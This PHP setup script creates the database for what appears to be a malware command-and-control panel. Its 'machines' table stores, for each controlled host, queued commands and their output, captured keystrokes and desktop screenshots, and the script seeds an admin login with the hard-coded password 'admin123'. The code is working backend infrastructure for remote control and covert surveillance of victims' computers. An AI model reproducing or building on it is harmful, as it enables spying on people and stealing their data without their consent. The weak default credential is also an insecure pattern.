<?php
require('./config.php');

try {
    $conn = new mysqli($db_servername, $db_username, $db_password);
    $create_db_query = "CREATE DATABASE IF NOT EXISTS {$db_name}";

    if ($conn->query($create_db_query) !== TRUE) {
        throw new Exception("Database creation failed: " . $conn->error);
    }

    $conn->select_db($db_name);

    $create_machines_table_query = "
        CREATE TABLE IF NOT EXISTS machines (
            id INT AUTO_INCREMENT PRIMARY KEY,
            name VARCHAR(255) NOT NULL,
            ip VARCHAR(50) NOT NULL,
            command TEXT,
            output TEXT,
            keylog TEXT,
            desktop LONGBLOB,
            last_active DATETIME DEFAULT CURRENT_TIMESTAMP
        )";

    if ($conn->query($create_machines_table_query) !== TRUE) {
        throw new Exception("Machines table creation failed: " . $conn->error);
    }

    $create_users_table_query = "
        CREATE TABLE IF NOT EXISTS users (
            id INT AUTO_INCREMENT PRIMARY KEY,
            username VARCHAR(255) NOT NULL UNIQUE,
            password VARCHAR(255) NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )";

    if ($conn->query($create_users_table_query) !== TRUE) {
        throw new Exception("Users table creation failed: " . $conn->error);
    }

    $admin_password_hashed = password_hash('admin123', PASSWORD_DEFAULT);
    $check_admin_query = "SELECT id FROM users WHERE username = 'admin'";
    $result = $conn->query($check_admin_query);

    if ($result->num_rows === 0) {
        $insert_admin_query = "INSERT INTO users (username, password) VALUES ('admin', ?)";
        $stmt = $conn->prepare($insert_admin_query);
        $stmt->bind_param('s', $admin_password_hashed);
        $stmt->execute();
        $stmt->close();
        echo "Admin user created successfully.";
    } else {
        echo "Admin user already exists.";
    }

} catch (mysqli_sql_exception $e) {
    echo "Error: " . $e->getMessage();
} catch (Exception $e) {
    echo "Error: " . $e->getMessage();
} finally {
    $conn->close();
}